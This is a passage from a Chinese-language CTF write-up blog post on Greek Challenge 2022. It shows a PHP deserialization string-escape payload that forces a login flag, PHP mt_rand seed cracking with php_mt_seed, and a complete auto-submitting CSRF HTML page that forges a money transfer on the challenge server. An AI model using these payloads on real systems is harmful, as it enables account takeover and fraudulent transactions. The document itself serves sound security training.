<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin-&gt;hacker 数量还是5,逃逸了一个字符</span><br><span class="line">构造payload:&quot;;s:7:&quot;islogin&quot;;i:1;&#125;一共21个字符</span><br><span class="line">输入21个admin就能逃逸出去payload:</span><br><span class="line">最终payload:</span><br><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:7:&quot;islogin&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="21登录试试"><a class="markdownIt-Anchor" href="#21登录试试">#</a> 21. 登录试试</h2>
<p>md5 加密密码爆破</p>
<h2 id="22drinktea"><a class="markdownIt-Anchor" href="#22drinktea">#</a> 22.drinktea</h2>
<p>考点：CSRF 漏洞，php 伪随机数漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">//真的随机吗？</span><br><span class="line">$seed = file_get_contents(&quot;/seed&quot;);</span><br><span class="line">mt_srand($seed);</span><br><span class="line">mt_rand();// == 1567320364</span><br><span class="line">mt_rand();</span><br><span class="line">mt_rand();</span><br><span class="line">mt_rand();</span><br><span class="line">mt_rand();</span><br><span class="line">mt_rand();</span><br><span class="line">$code = md5(mt_rand());</span><br><span class="line">echo file_get_contents(&quot;random.php&quot;);</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure>
<p>PHP 伪随机数漏洞，可以看这篇<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU4Nzg0Mzc5L2FydGljbGUvZGV0YWlscy8xMjE3MTUwNzI="> (143 条消息) PHP 伪随机数漏洞，以及 php_mt_seed 脚本的使用_php_mt_seed.c_sGanYu 的博客 - CSDN 博客</span><br>
使用:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 1567320364 </span><br><span class="line">Pattern: EXACT</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xa8000000 - 0xabffffff, speed 21681.3 Mseeds/s </span><br><span class="line">seed = 0xaa4cbfec = 2857156588 (PHP 3.0.7 to 5.2.0)</span><br><span class="line">seed = 0xaa4cbfed = 2857156589 (PHP 3.0.7 to 5.2.0)</span><br><span class="line">Found 2, trying 0xfc000000 - 0xffffffff, speed 22251.9 Mseeds/s </span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 2, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s </span><br><span class="line">seed = 0x000a2c2a = 666666 (PHP 7.1.0+)</span><br><span class="line">Found 3, trying 0x16000000 - 0x17ffffff, speed 251.1 Mseeds/s </span><br><span class="line">seed = 0x16b73644 = 381105732 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">Found 4, trying 0xbe000000 - 0xbfffffff, speed 249.6 Mseeds/s </span><br><span class="line">seed = 0xbf3e7fc3 = 3208544195 (PHP 7.1.0+)</span><br><span class="line">Found 5, trying 0xfe000000 - 0xffffffff, speed 249.2 Mseeds/s </span><br><span class="line">Found 5</span><br></pre></td></tr></table></figure>
<p>找到 666666, 利用上面的 php 代码生产验证码，根据留言提示可知利用反馈页面进行 csrf 攻击，来根据转账页面伪造转账来赚米，vps 放 csrf.html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;form action=&quot;&lt;http://mc.vveelin.com.cn:8102/trans.php&gt;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;user&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;999999999999&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script language=javascript&gt;</span><br><span class="line">setTimeout(&quot;document.forms[0].submit()&quot;,1000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>然后让对方访问这个 html 文件，到账买双皮奶拿 flag</p>
<h2 id="23lovesyc"><a class="markdownIt-Anchor" href="#23lovesyc">#</a> 23.LoveSyc</h2>
<p>源代码</p>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-07-11 22:48:12" itemprop="dateModified" datetime="2023-07-11T22:48:12+08:00">2023-07-11</time>
  </span>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="https://hq185187.github.io/2023/07/11/Greek%20Challenge2022/" title="Greek Challenge2022">https://hq185187.github.io/2023/07/11/Greek Challenge2022/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;9.jpg" title="慢日志注入">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> SQL注入</span>
  <h3>慢日志注入</h3>
  </a>

    </div>
    <div class="item right">
    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1babysql"><span class="toc-number">1.</span> <span class="toc-text"> 1.babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2cointowin"><span class="toc-number">2.</span> <span class="toc-text"> 2.cointowin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3easygame"><span class="toc-number">3.</span> <span class="toc-text"> 3.easygame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4jsfind"><span class="toc-number">4.</span> <span class="toc-text"> 4.jsfind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5rceus"><span class="toc-number">5.</span> <span class="toc-text"> 5.rceus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6uploadrce"><span class="toc-number">6.</span> <span class="toc-text"> 6.UploadRce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7welcomesql"><span class="toc-number">7.</span> <span class="toc-text"> 7.WelcomeSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8noobsql"><span class="toc-number">8.</span> <span class="toc-text"> 8.noobsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9easysql"><span class="toc-number">9.</span> <span class="toc-text"> 9.easysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10justphp"><span class="toc-number">10.</span> <span class="toc-text"> 10.justphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11ezrfi"><span class="toc-number">11.</span> <span class="toc-text"> 11.ezrfi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12babyupload"><span class="toc-number">12.</span> <span class="toc-text"> 12.babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13%E6%9D%A5%E5%8F%91%E4%B8%AA%E5%8C%85"><span class="toc-number">13.</span> <span class="toc-text"> 13. 来发个包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14can-can-need"><span class="toc-number">14.</span> <span class="toc-text"> 14.Can Can Need</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15ezrce"><span class="toc-number">15.</span> <span class="toc-text"> 15.ezrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16not_stay"><span class="toc-number">16.</span> <span class="toc-text"> 16.Not_Stay</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17easyphp"><span class="toc-number">17.</span> <span class="toc-text"> 17.easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18edit_php"><span class="toc-number">18.</span> <span class="toc-text"> 18.edit_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19ezrequest"><span class="toc-number">19.</span> <span class="toc-text"> 19.ezrequest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20login_into_my_heart"><span class="toc-number">20.</span> <span class="toc-text"> 20.login_into_my_heart</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21%E7%99%BB%E5%BD%95%E8%AF%95%E8%AF%95"><span class="toc-number">21.</span> <span class="toc-text"> 21. 登录试试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22drinktea"><span class="toc-number">22.</span> <span class="toc-text"> 22.drinktea</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23lovesyc"><span class="toc-number">23.</span> <span class="toc-text"> 23.LoveSyc</span></a></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="hq185187"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">hq185187</p>
  <div class="description" itemprop="description">不定时更新web安全相关知识</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">36</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">3</span>
        <span class="name">分类</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hxMTg1MTg3" title="https:&#x2F;&#x2F;github.com&#x2F;hq185187"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
</div>

    <span><a href="/2023/06/04/nssctf3/" title="NSSCTF3">NSSCTF3</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Phar反序列化学习">Phar反序列化学习</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
</div>

    <span><a href="/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/" title="SQL注入绕过">SQL注入绕过</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/07/11/Greek%20Challenge2022/" title="Greek Challenge2022">Greek Challenge2022</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/05/14/LitCTF2023/" title="LitCTF2023">LitCTF2023</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">原型链污染</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/07/06/xxe%E6%B3%A8%E5%85%A5/" title="XXE注入">XXE注入</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/30/SSRF/" title="SSRF绕过">SSRF绕过</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">hq185187 @ 不良人天藏星</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="站点总字数">182k 字</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="站点阅读时长">2:45</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2023/07/11/Greek Challenge2022/',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
